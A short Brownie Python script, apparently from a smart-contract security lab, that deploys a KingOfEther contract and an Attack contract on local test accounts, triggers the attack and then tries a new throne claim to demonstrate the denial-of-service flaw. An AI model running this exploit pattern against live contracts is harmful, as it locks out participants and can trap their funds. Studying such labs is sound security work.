from brownie import KingOfEther, Attack, accounts
from web3 import Web3

def main():
    deploy_king_of_ether()
    deploy_attack()
    attack()
    claim_throne()

def deploy_king_of_ether():
    king_of_ether = KingOfEther.deploy({"from": accounts[0]})


def deploy_attack():
    attack = Attack.deploy( {"from": accounts[1]})

def attack():
    tx = Attack[-1].attack(KingOfEther[-1],{"from": accounts[1],  "value": Web3.toWei(1, "ether")})

def claim_throne():
    tx = KingOfEther[-1].claimThrone({"from": accounts[2], "value": Web3.toWei(2, "ether")})